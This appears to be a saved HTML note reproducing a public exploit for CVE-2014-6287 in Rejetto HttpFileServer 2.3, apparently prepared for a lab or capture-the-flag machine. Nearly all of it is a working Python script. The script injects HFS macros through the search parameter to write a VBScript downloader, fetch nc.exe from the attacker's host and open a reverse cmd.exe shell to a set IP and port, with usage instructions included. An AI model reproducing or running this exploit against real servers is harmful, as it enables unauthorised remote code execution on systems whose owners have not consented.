<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>HttpFileServer 2.3 Rejetto</title>
</head><body>CVE-2014-6287<br/>
<br/>
<br/>
https://www.exploit-db.com/exploits/39161<br/>
<b><br/>
</b><b>1. setup python http server for nc.exe at port 80</b><br/>
<br/>
<br/>
# Remote: Yes<br/>
# Exploit Author: Avinash Kumar Thapa aka "-Acid"<br/>
# Vendor Homepage: http://rejetto.com/<br/>
# Software Link: http://sourceforge.net/projects/hfs/<br/>
# Version: 2.3.x<br/>
# Tested on: Windows Server 2008 , Windows 8, Windows 7<br/>
# CVE : CVE-2014-6287<br/>
# Description: You can use HFS (HTTP File Server) to send and receive files.<br/>
# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.<br/>
# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. <br/>
&nbsp;<br/>
#Usage : python Exploit.py &lt;Target IP address&gt; &lt;Target Port Number&gt;<br/>
<br/>
#EDB Note: You need to be using a web server hosting netcat (http://&lt;attackers_ip&gt;:80/nc.exe). &nbsp;<br/>
# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;You may need to run it multiple times for success!<br/>
<br/>
<br/>
import urllib2<br/>
import sys<br/>
<br/>
try:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; def script_create():<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; def execute_script():<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; def nc_run():<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ip_addr = "<b>10.10.14.27</b>" #local IP address<br/>
&nbsp; &nbsp; &nbsp; &nbsp; local_port = "<b>443</b>" # Local Port number<br/>
&nbsp; &nbsp; &nbsp; &nbsp; vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; save= "save|" + vbs<br/>
&nbsp; &nbsp; &nbsp; &nbsp; vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; exe= "exec|"+vbs2<br/>
&nbsp; &nbsp; &nbsp; &nbsp; vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port<br/>
&nbsp; &nbsp; &nbsp; &nbsp; exe1= "exec|"+vbs3<br/>
&nbsp; &nbsp; &nbsp; &nbsp; script_create()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; execute_script()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; nc_run()<br/>
except:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; print """[.]Something went wrong..!<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Usage is :[.] python exploit.py &lt;Target IP address&gt; &nbsp;&lt;Target Port Number&gt;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Don't forgot to change the Local IP address and Port number on the script"""<br/>
</body></html>